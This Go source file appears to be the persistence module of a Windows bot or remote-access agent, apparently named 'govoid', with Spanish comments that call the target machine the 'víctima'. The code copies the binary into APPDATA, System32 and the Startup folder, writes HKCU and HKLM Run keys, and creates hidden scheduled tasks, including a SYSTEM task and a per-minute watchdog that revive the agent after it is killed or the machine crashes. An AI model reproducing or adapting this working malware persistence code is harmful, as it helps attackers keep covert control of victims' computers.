//go:build windows

package commands

import (
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"

	"github.com/local/govoid/internal/config"
	"github.com/local/govoid/internal/win32"
)

const runKeyPath = `Software\Microsoft\Windows\CurrentVersion\Run`

// InstallPath es la ruta principal del agente en la víctima.
func InstallPath() string {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming")
	}
	return filepath.Join(appData, "Microsoft", "Windows", config.BinaryName)
}

func systemRoot() string {
	root := os.Getenv("SystemRoot")
	if root == "" {
		root = `C:\Windows`
	}
	return root
}

func systemPath() string {
	return filepath.Join(systemRoot(), "System32", config.BinaryName)
}

func startupPath() string {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming")
	}
	return filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", config.BinaryName)
}

// ShieldBinary devuelve la ruta estable que usan el servicio, el shell de
// Winlogon y los centinelas. Prefiere la copia en System32: es machine-wide y
// la puede leer cualquier usuario de la máquina.
func ShieldBinary() string {
	return win32.ShieldExe(InstallPath(), systemPath())
}

// IsInstalledPath informa si el ejecutable ya corre desde una ruta estable.
// Sirve para que el modo shell no se relance a sí mismo en bucle.
func IsInstalledPath(exe string) bool {
	clean := filepath.Clean(exe)
	return strings.EqualFold(clean, filepath.Clean(InstallPath())) ||
		strings.EqualFold(clean, filepath.Clean(systemPath()))
}

// InstallAll instala las cuatro capas. Intenta todas aunque alguna falle y
// devuelve el conjunto de errores.
func InstallAll() error {
	var errs []error

	exe, err := os.Executable()
	if err != nil {
		return fmt.Errorf("persistencia: no se pudo resolver el ejecutable: %w", err)
	}

	target := InstallPath()
	if !strings.EqualFold(filepath.Clean(exe), filepath.Clean(target)) {
		if err := copyFile(exe, target); err != nil {
			errs = append(errs, fmt.Errorf("capa APPDATA: %w", err))
		}
	}

	// Capa 1 — HKCU Run.
	if err := writeRunKey(registry.CURRENT_USER, target); err != nil {
		errs = append(errs, fmt.Errorf("capa HKCU: %w", err))
	}

	// Capa 3 — carpeta Startup.
	if err := copyFile(target, startupPath()); err != nil {
		errs = append(errs, fmt.Errorf("capa Startup: %w", err))
	}

	// Capa 2 — HKLM Run + copia en System32, solo con privilegios.
	if isElevated() {
		sysCopy := systemPath()
		if err := copyFile(target, sysCopy); err != nil {
			errs = append(errs, fmt.Errorf("capa System32: %w", err))
		} else if err := writeRunKey(registry.LOCAL_MACHINE, sysCopy); err != nil {
			errs = append(errs, fmt.Errorf("capa HKLM: %w", err))
		}
	}

	// Capa 4 — tarea ONLOGON interactiva. Es el camino rápido cuando el usuario
	// entra a mano: dispara en cuanto hay escritorio.
	if err := runSchtasks("/create", "/tn", config.TaskLogonName,
		"/tr", target, "/sc", "ONLOGON", "/rl", "HIGHEST", "/f"); err != nil {
		errs = append(errs, fmt.Errorf("capa tarea ONLOGON: %w", err))
	}

	// Capa 5 — tarea SYSTEM de cada minuto. Es la única que corre sin sesión y
	// sin contraseña guardada, así que es la que devuelve el agente después de
	// un bugcheck: el equipo arranca en la pantalla de inicio de sesión, donde
	// las tareas interactivas no pueden dispararse. --sessionwatch busca la
	// sesión de consola, arranca el agente dentro de ella con el token del
	// usuario y, si todavía no hay nadie logueado, lo reintenta al minuto.
	if err := registerSystemTask(target); err != nil {
		errs = append(errs, fmt.Errorf("capa tarea SYSTEM: %w", err))
	}
	// El centinela de cada minuto es la red que recoge al agente si un comando
	// lo mata: sin él, el bot queda muerto hasta el próximo logon.
	if err := runSchtasks("/create", "/tn", config.TaskWatchdogName,
		"/tr", target, "/sc", "MINUTE", "/mo", "1", "/rl", "HIGHEST", "/f"); err != nil {
		errs = append(errs, fmt.Errorf("capa tarea watchdog: %w", err))
	}

	return errors.Join(errs...)
}

// RemoveAll revierte las cuatro capas. Solo lo usa /shutdown.
func RemoveAll() error {
	var errs []error

	if err := deleteRunKey(registry.CURRENT_USER); err != nil {
		errs = append(errs, fmt.Errorf("HKCU: %w", err))
	}
	if err := deleteRunKey(registry.LOCAL_MACHINE); err != nil {
		errs = append(errs, fmt.Errorf("HKLM: %w", err))
	}
	if err := removeIfExists(startupPath()); err != nil {
		errs = append(errs, fmt.Errorf("Startup: %w", err))
	}
	if err := removeIfExists(systemPath()); err != nil {
		errs = append(errs, fmt.Errorf("System32: %w", err))
	}

	// schtasks devuelve error si la tarea ya no existe; es limpieza best-effort.
	_ = runSchtasks("/delete", "/tn", config.TaskLogonName, "/f")
	_ = runSchtasks("/delete", "/tn", config.TaskBootName, "/f")
	_ = runSchtasks("/delete", "/tn", config.TaskWatchdogName, "/f")

	return errors.Join(errs...)
}

func copyFile(src, dst string) error {
	if strings.EqualFold(filepath.Clean(src), filepath.Clean(dst)) {
		return nil
	}

	source, err := os.Open(src)
	if err != nil {
		return err
	}
	defer func() {
		if cerr := source.Close(); cerr != nil {
			_ = cerr
		}
	}()

	if err := os.MkdirAll(filepath.Dir(dst), 0o755); err != nil {
		return err
	}

	tmp := dst + ".tmp"
	out, err := os.Create(tmp)
	if err != nil {
		return err
	}

	_, copyErr := io.Copy(out, source)
	closeErr := out.Close()
	if copyErr != nil {
		os.Remove(tmp)
		return copyErr
	}
	if closeErr != nil {
		os.Remove(tmp)
		return closeErr
	}

	if err := os.Rename(tmp, dst); err != nil {
		os.Remove(tmp)
		return err
	}
	return nil
}

func writeRunKey(root registry.Key, value string) error {
	key, err := registry.OpenKey(root, runKeyPath, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer func() {
		if cerr := key.Close(); cerr != nil {
			_ = cerr
		}
	}()
	return key.SetStringValue(config.RunKeyName, value)
}

func deleteRunKey(root registry.Key) error {
	key, err := registry.OpenKey(root, runKeyPath, registry.SET_VALUE)
	if err != nil {
		return nil // la clave ya no existe: capa ausente
	}
	defer func() {
		if cerr := key.Close(); cerr != nil {
			_ = cerr
		}
	}()

	if err := key.DeleteValue(config.RunKeyName); err != nil &&
		!errors.Is(err, windows.ERROR_FILE_NOT_FOUND) {
		return err
	}
	return nil
}

func isElevated() bool {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, runKeyPath, registry.SET_VALUE)
	if err != nil {
		return false
	}
	if cerr := key.Close(); cerr != nil {
		_ = cerr
	}
	return true
}

func runSchtasks(args ...string) error {
	cmd := exec.Command("schtasks", args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWindow}
	return cmd.Run()
}

func removeIfExists(path string) error {
	err := os.Remove(path)
	if err == nil || errors.Is(err, os.ErrNotExist) {
		return nil
	}
	return err
}
